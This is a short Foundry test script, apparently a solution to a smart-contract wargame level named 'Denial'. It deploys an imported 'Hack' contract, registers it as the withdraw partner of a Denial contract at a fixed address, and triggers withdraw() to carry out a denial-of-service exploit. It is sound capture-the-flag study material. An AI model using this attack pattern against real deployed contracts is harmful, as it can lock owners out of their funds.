// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Hack, Denial} from "../src/Denial.sol";

contract DenialTest is Test {
    Hack hack;
    Denial denial;

    function setUp() external {
        denial = Denial(payable(0x57fBD528eD29a25209c7A58e32B4590867aEA642));
        vm.startBroadcast();
        hack = new Hack(denial);
        vm.stopBroadcast();
    }

    function testWithdraw() public {
        vm.startBroadcast();
        denial.setWithdrawPartner(address(hack));
        denial.withdraw();
        vm.stopBroadcast();
    }
}
